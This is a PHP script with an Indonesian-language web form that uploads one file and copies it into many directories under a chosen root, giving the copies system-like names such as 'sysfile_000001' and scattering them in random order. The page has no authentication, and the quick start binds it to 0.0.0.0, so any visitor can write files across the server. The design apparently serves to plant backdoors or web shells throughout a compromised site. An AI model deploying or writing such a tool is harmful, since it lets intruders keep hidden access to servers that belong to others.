<?php
// tebar.php - Upload one file and copy it into many directories with auto-renaming.
// Usage: Open this file via a PHP server (e.g., php -S 0.0.0.0:8000) and navigate to it.

ini_set('display_errors', '1');
error_reporting(E_ALL);

// Configuration defaults
$defaultRoot = getcwd();
$defaultNamesFile = __DIR__ . DIRECTORY_SEPARATOR . 'names.txt';

function readNamesList(string $namesFilePath, int $needed): array {
    $names = [];
    if (is_file($namesFilePath)) {
        $lines = file($namesFilePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                $trimmed = trim($line);
                if ($trimmed !== '') {
                    $names[] = $trimmed;
                }
            }
        }
    }

    if (count($names) >= $needed) {
        return $names;
    }

    // Generate deterministic extra names if list is short
    $generated = [];
    $base = 'sysfile_';
    $pad = 6;
    for ($i = 1; count($names) + count($generated) < $needed; $i++) {
        $generated[] = $base . str_pad((string)$i, $pad, '0', STR_PAD_LEFT);
    }

    return array_merge($names, $generated);
}

function listDirectories(string $root, bool $leafOnly): array {
    $rootReal = realpath($root);
    if ($rootReal === false || !is_dir($rootReal)) {
        throw new RuntimeException('Invalid root directory.');
    }

    $dirs = [];
    $hasSubdirs = [];

    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootReal, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iter as $path => $info) {
        if ($info->isDir()) {
            $dirs[$path] = true;
            $parent = dirname($path);
            if ($parent && $parent !== $path) {
                $hasSubdirs[$parent] = true;
            }
        }
    }

    if ($leafOnly) {
        $leaf = [];
        foreach (array_keys($dirs) as $d) {
            if (empty($hasSubdirs[$d])) {
                $leaf[] = $d;
            }
        }
        sort($leaf);
        return $leaf;
    }

    $all = array_keys($dirs);
    sort($all);
    return $all;
}

function ensureUniqueFilename(string $dir, string $basename): string {
    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
    if (!file_exists($target)) {
        return $basename;
    }
    $pathInfo = pathinfo($basename);
    $name = $pathInfo['filename'] ?? $basename;
    $ext = isset($pathInfo['extension']) && $pathInfo['extension'] !== '' ? '.' . $pathInfo['extension'] : '';
    $i = 1;
    do {
        $candidate = $name . '_' . $i . $ext;
        $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
        if (!file_exists($target)) {
            return $candidate;
        }
        $i++;
    } while (true);
}

function sanitizeFileName(string $name): string {
    // Remove path separators and control chars
    $name = preg_replace('/[\\\/*?:"<>|\x00-\x1F]/', '_', $name);
    $name = trim($name, ". \t\n\r\0\x0B");
    return $name === '' ? 'file' : $name;
}

function postParam(string $key, $default = null) {
    return $_POST[$key] ?? $default;
}

function boolParam(string $key): bool {
    return isset($_POST[$key]) && in_array($_POST[$key], ['1', 'true', 'on'], true);
}

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$errors = [];
$result = null;

if ($method === 'POST') {
    try {
        if (!isset($_FILES['upload']) || !is_uploaded_file($_FILES['upload']['tmp_name'])) {
            throw new RuntimeException('No file uploaded.');
        }

        $root = postParam('root', $defaultRoot);
        $namesFile = postParam('namesFile', $defaultNamesFile);
        $leafOnly = postParam('target', 'leaf') === 'leaf';
        $randomize = boolParam('randomize');
        $limit = (int)postParam('limit', 0);
        $dryRun = boolParam('dryRun');

        $rootReal = realpath($root);
        if ($rootReal === false || !is_dir($rootReal)) {
            throw new RuntimeException('Root directory not found.');
        }

        $dirs = listDirectories($rootReal, $leafOnly);
        if (empty($dirs)) {
            throw new RuntimeException('No target directories found.');
        }

        if ($randomize) {
            shuffle($dirs);
        }
        if ($limit > 0) {
            $dirs = array_slice($dirs, 0, $limit);
        }

        $originalName = $_FILES['upload']['name'] ?? 'upload.bin';
        $originalName = sanitizeFileName($originalName);
        $ext = pathinfo($originalName, PATHINFO_EXTENSION);
        $ext = $ext !== '' ? ('.' . $ext) : '';

        $needed = count($dirs);
        $namePool = readNamesList($namesFile, $needed);
        if (count($namePool) < $needed) {
            $errors[] = 'Warning: name list shorter than needed; generated extras used.';
        }

        $copied = [];
        $skipped = [];

        $tmpPath = $_FILES['upload']['tmp_name'];
        $i = 0;
        foreach ($dirs as $dir) {
            $baseName = sanitizeFileName($namePool[$i] ?? ('file_' . ($i + 1)));
            $fileName = $baseName . $ext;
            $fileName = ensureUniqueFilename($dir, $fileName);
            $targetPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;

            if ($dryRun) {
                $copied[] = ['dir' => $dir, 'file' => $fileName, 'path' => $targetPath, 'dry' => true];
            } else {
                if (!is_writable($dir)) {
                    $skipped[] = ['dir' => $dir, 'reason' => 'Not writable'];
                } else {
                    // Use copy to replicate the uploaded file into many locations efficiently
                    if (@copy($tmpPath, $targetPath)) {
                        $copied[] = ['dir' => $dir, 'file' => $fileName, 'path' => $targetPath, 'dry' => false];
                    } else {
                        $skipped[] = ['dir' => $dir, 'reason' => 'Copy failed'];
                    }
                }
            }
            $i++;
        }

        $result = [
            'totalTargets' => count($dirs),
            'copied' => $copied,
            'skipped' => $skipped,
            'errors' => $errors,
            'leafOnly' => $leafOnly,
            'randomize' => $randomize,
            'limit' => $limit,
            'root' => $rootReal,
            'namesFile' => $namesFile,
            'dryRun' => $dryRun,
            'original' => $originalName,
        ];
    } catch (Throwable $e) {
        $errors[] = $e->getMessage();
        $result = ['errors' => $errors];
    }
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }

?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Tebar File (PHP)</title>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 24px; line-height: 1.45; }
    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; max-width: 980px; }
    .row { margin-bottom: 12px; }
    label { display: block; font-weight: 600; margin-bottom: 6px; }
    input[type=text] { width: 100%; padding: 8px; }
    input[type=file] { padding: 6px 0; }
    .help { color: #666; font-size: 12px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 12px; }
    .btn { background: #0d6efd; color: #fff; border: none; padding: 10px 14px; border-radius: 6px; cursor: pointer; }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    details { margin-top: 10px; }
    summary { cursor: pointer; font-weight: 600; }
    code { background: #f6f8fa; padding: 2px 4px; border-radius: 4px; }
    table { border-collapse: collapse; width: 100%; font-size: 13px; }
    th, td { border: 1px solid #ddd; padding: 6px 8px; text-align: left; }
    th { background: #fafafa; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Tebar File ke Banyak Folder</h2>
    <form method="post" enctype="multipart/form-data">
      <div class="row">
        <label for="upload">File untuk ditebar</label>
        <input type="file" id="upload" name="upload" required />
      </div>

      <div class="grid">
        <div>
          <label for="root">Root direktori</label>
          <input type="text" id="root" name="root" value="<?php echo h($defaultRoot); ?>" />
          <div class="help">Contoh: <?php echo h($defaultRoot); ?></div>
        </div>
        <div>
          <label for="namesFile">File daftar nama</label>
          <input type="text" id="namesFile" name="namesFile" value="<?php echo h($defaultNamesFile); ?>" />
          <div class="help">Satu nama per baris. Jika kurang, akan di-generate otomatis.</div>
        </div>
      </div>

      <div class="row">
        <label>Target direktori</label>
        <label><input type="radio" name="target" value="leaf" checked /> Hanya folder terdalam (leaf)</label>
        <label><input type="radio" name="target" value="all" /> Semua folder</label>
      </div>

      <div class="grid">
        <div>
          <label for="limit">Batas jumlah target (opsional)</label>
          <input type="text" id="limit" name="limit" placeholder="0 = tanpa batas" value="0" />
        </div>
        <div>
          <label>&nbsp;</label>
          <label><input type="checkbox" name="randomize" /> Acak urutan folder</label>
          <label><input type="checkbox" name="dryRun" /> Dry run (tanpa menyalin)</label>
        </div>
      </div>

      <div class="row">
        <button class="btn" type="submit">Tebar Sekarang</button>
      </div>
    </form>

    <?php if ($result !== null): ?>
      <hr />
      <h3>Hasil</h3>
      <?php if (!empty($result['errors'])): ?>
        <div style="color: #b00020;">
          <?php foreach ($result['errors'] as $e): ?>
            <div>• <?php echo h($e); ?></div>
          <?php endforeach; ?>
        </div>
      <?php endif; ?>

      <?php if (isset($result['root'])): ?>
        <div class="row">
          <div><strong>Root:</strong> <code><?php echo h($result['root']); ?></code></div>
          <div><strong>Target:</strong> <?php echo $result['leafOnly'] ? 'Leaf-only' : 'All directories'; ?></div>
          <div><strong>Acak:</strong> <?php echo $result['randomize'] ? 'Ya' : 'Tidak'; ?></div>
          <div><strong>Batas:</strong> <?php echo (int)$result['limit']; ?></div>
          <div><strong>Dry run:</strong> <?php echo $result['dryRun'] ? 'Ya' : 'Tidak'; ?></div>
          <div><strong>Nama asal:</strong> <code><?php echo h($result['original'] ?? ''); ?></code></div>
        </div>
      <?php endif; ?>

      <?php if (!empty($result['copied'])): ?>
        <details open>
          <summary>Berhasil (<?php echo count($result['copied']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Nama File</th><th>Path</th><th>Mode</th></tr></thead>
            <tbody>
              <?php foreach ($result['copied'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><code><?php echo h($row['file']); ?></code></td>
                  <td><code><?php echo h($row['path']); ?></code></td>
                  <td><?php echo !empty($row['dry']) ? 'Dry' : 'Copy'; ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>

      <?php if (!empty($result['skipped'])): ?>
        <details>
          <summary>Terlewat/Skip (<?php echo count($result['skipped']); ?>)</summary>
          <table>
            <thead><tr><th>#</th><th>Folder</th><th>Alasan</th></tr></thead>
            <tbody>
              <?php foreach ($result['skipped'] as $i => $row): ?>
                <tr>
                  <td><?php echo $i + 1; ?></td>
                  <td><code><?php echo h($row['dir']); ?></code></td>
                  <td><?php echo h($row['reason']); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      <?php endif; ?>

    <?php endif; ?>
  </div>

  <details style="margin-top:16px;">
    <summary>Cara jalanin cepat (CLI)</summary>
    <pre>php -S 0.0.0.0:8000 -t <?php echo h(getcwd()); ?></pre>
    <div>Buka di browser: <code>http://localhost:8000/tebar.php</code></div>
  </details>
</body>
</html>
